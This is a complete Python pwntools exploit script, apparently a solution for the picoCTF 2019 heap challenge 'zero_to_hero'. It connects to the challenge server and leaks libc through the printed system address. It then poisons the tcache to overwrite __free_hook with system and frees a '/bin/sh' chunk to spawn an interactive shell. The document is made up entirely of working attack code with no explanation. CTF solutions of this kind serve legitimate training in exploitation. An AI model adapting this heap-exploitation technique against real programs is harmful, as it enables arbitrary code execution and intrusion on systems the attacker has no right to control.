#!/usr/bin/env python

from pwn import *

#p = process('./zero_to_hero')
p = remote('2019shell1.picoctf.com',49929)
e = ELF('./zero_to_hero')
libc = ELF('./libc.so.6')

def malloc(size,data):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(size))
    p.sendafter('> ',data)

def free(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ',str(idx))

def die():
    p.sendlineafter('> ','3')

p.sendlineafter('?\n','y')

for i in xrange(2):
    p.recvline()

system = int(p.recvline().strip().split(' ')[-1],16)
libc.address = system-libc.symbols['system']

log.success('libc base at: '+hex(libc.address))
log.success('system at: '+hex(system))
log.success('free hook at: '+hex(libc.symbols['__free_hook']))

malloc(0x58,'a')
malloc(0x178,'b')

free(0)
free(1)

malloc(0x58,'A'*0x58)
free(1)

malloc(0xf8,p64(libc.symbols['__free_hook']))
malloc(0x178,'a')

malloc(0x178,p64(libc.symbols['system']))

malloc(0x20,'/bin/sh\x00')
free(6)

p.interactive()
